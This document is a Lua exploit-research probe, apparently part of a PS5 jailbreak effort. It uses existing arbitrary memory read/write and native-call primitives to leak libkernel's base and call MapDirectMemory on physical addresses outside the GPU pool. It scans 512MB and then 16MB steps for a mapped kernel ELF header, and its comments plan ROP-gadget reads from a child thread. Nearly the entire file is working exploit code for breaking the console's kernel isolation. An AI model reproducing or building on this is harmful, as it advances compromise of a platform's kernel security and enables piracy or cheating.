-- CRASH_CLASS: MODERATE
-- PROBE 561a: MapDirectMemory with physical addresses OUTSIDE GPU pool
--
-- KEY INSIGHT: GPU pool is 0 to ~0x150000000 (5.375GB).
-- PS5 has 16GB GDDR6. Kernel lives somewhere in the other ~10.6GB.
-- We confirmed MapDM works for in-pool addresses (558g).
-- QUESTION: does MapDM accept physical addresses BEYOND the pool?
--
-- If YES → we can map kernel physical memory to our virtual space.
-- Even if the mapped page is "write-only from Lua" (as 558g showed),
-- a child thread ROP chain can read it via mov rax,[rsi];ret gadget.
--
-- Test plan:
-- A) Call MapDM with phys addrs at 2GB, 4GB, 6GB, 8GB, 10GB, 12GB, 14GB
-- B) For any that succeed, try reading via child thread
-- C) Scan for ELF header (kernel image)

print("=== PROBE 561a: MapDM OUT-OF-POOL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc73  = mk(73)   -- munmap
local sc477 = mk(477)  -- mmap
local sc593 = mk(593)  -- dynlib_get_info

local pid = N(sc20())
print("pid=" .. pid)

-- Get libkernel base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))

-- MapDirectMemory at libkernel+0x15020
local mapdm_fn = lk + uint64(0x15020)
io.flush()

-- ============================================================
-- TEST A: MapDM acceptance test for out-of-pool physical addresses
-- ============================================================
print("")
print("=== TEST A: MapDM phys range acceptance ===")
io.flush()

-- Test physical addresses from 0 to 15GB in 512MB steps
-- For each: pre-map anonymous page, call MapDM, check return value
local base_va = uint64("0x880000000")  -- our mapping region
local page_sz = 0x4000  -- 16KB

local results = {}
local step = 0x20000000  -- 512MB steps

for gi = 0, 31 do
    local phys_hi = 0
    local phys_lo = gi * step
    -- Handle overflow for > 4GB
    while phys_lo >= 0x100000000 do
        phys_lo = phys_lo - 0x100000000
        phys_hi = phys_hi + 1
    end
    local phys = uint64(string.format("0x%X%08X", phys_hi, phys_lo))
    local va = base_va + uint64(gi * page_sz * 4)  -- space them out

    repeat
    -- Pre-map anonymous page at va
    local ok_m, rv_m = pcall(function()
        return sc477(va, uint64(page_sz), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)

    if not ok_m then
        print(string.format("  phys=0x%X%08X: pre-map FAIL", phys_hi, phys_lo))
        break
    end

    -- Write sentinel to verify the page is accessible
    local ok_ws = pcall(function() memory.write_dword(va, 0x12345678) end)
    if not ok_ws then
        print(string.format("  phys=0x%X%08X: pre-map not writable", phys_hi, phys_lo))
        pcall(function() sc73(va, uint64(page_sz)) end)
        break
    end

    -- Call MapDirectMemory
    local ok_md, rv_md = pcall(function()
        return native.fcall_with_rax(mapdm_fn, 0,
            va, uint64(page_sz), uint64(3), Z, phys, uint64(page_sz))
    end)
    local md_rv = ok_md and N(rv_md) or -999

    local status
    if md_rv == 0 then
        -- MapDM succeeded! Try to read (will likely crash past pcall)
        local ok_rd, val = pcall(function() return memory.read_dword(va) end)
        if ok_rd then
            local v = N(val)
            if v < 0 then v = v + 0x100000000 end
            status = string.format("OK! read=0x%08X", v)

            -- Check for ELF header
            if v == 0x464C457F then
                status = status .. " *** ELF HEADER! ***"
            end
        else
            status = "MAPPED but read crashes (write-only)"
            -- Try writing to verify it's actually mapped
            local ok_wr = pcall(function() memory.write_dword(va, 0xDEAD) end)
            if ok_wr then
                status = status .. " (writable)"
            else
                status = status .. " (not writable either)"
            end
        end
    else
        -- Get error code
        if md_rv < 0 then md_rv = md_rv + 0x100000000 end
        status = string.format("FAIL rv=0x%X", md_rv)
    end

    print(string.format("  phys=0x%X%08X: %s", phys_hi, phys_lo, status))
    results[gi] = {phys_hi, phys_lo, md_rv}

    -- Unmap
    pcall(function() sc73(va, uint64(page_sz)) end)

    until true
    io.flush()
end

-- ============================================================
-- TEST B: Finer scan around any successful regions
-- ============================================================
print("")
print("=== TEST B: Fine scan of accepted regions ===")
io.flush()

-- Find which regions MapDM accepted
local accepted = {}
for gi = 0, 31 do
    if results[gi] and results[gi][3] == 0 then
        accepted[#accepted + 1] = {results[gi][1], results[gi][2]}
    end
end

print(string.format("accepted regions: %d", #accepted))

-- For each accepted region, do a finer scan with 16MB steps
for _, r in ipairs(accepted) do
    local r_base_hi = r[1]
    local r_base_lo = r[2]
    print(string.format("\n  fine scan around 0x%X%08X:", r_base_hi, r_base_lo))

    for fi = -4, 4 do
        local fine_lo = r_base_lo + fi * 0x1000000  -- 16MB steps
        local fine_hi = r_base_hi
        while fine_lo < 0 do fine_lo = fine_lo + 0x100000000; fine_hi = fine_hi - 1 end
        while fine_lo >= 0x100000000 do fine_lo = fine_lo - 0x100000000; fine_hi = fine_hi + 1 end
        repeat
        if fine_hi < 0 then break end

        local fphys = uint64(string.format("0x%X%08X", fine_hi, fine_lo))
        local fva = base_va + uint64((fi + 4) * page_sz * 4)

        pcall(function()
            sc477(fva, uint64(page_sz), uint64(3),
                uint64(0x1012), uint64(0xFFFFFFFF), Z)
        end)
        pcall(function() memory.write_dword(fva, 0) end)

        local ok_f, rv_f = pcall(function()
            return native.fcall_with_rax(mapdm_fn, 0,
                fva, uint64(page_sz), uint64(3), Z, fphys, uint64(page_sz))
        end)
        local frv = ok_f and N(rv_f) or -999
        if frv == 0 then
            local ok_fr, fval = pcall(function() return memory.read_dword(fva) end)
            if ok_fr then
                local fv = N(fval)
                if fv < 0 then fv = fv + 0x100000000 end
                local tag = ""
                if fv == 0x464C457F then tag = " *** ELF! ***" end
                if fv == 0 then tag = " (zero)" end
                print(string.format("    0x%X%08X: read=0x%08X%s", fine_hi, fine_lo, fv, tag))
            else
                print(string.format("    0x%X%08X: mapped, read-crash", fine_hi, fine_lo))
            end
        end

        pcall(function() sc73(fva, uint64(page_sz)) end)
        until true
    end
    io.flush()
end

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 561a DONE ===")
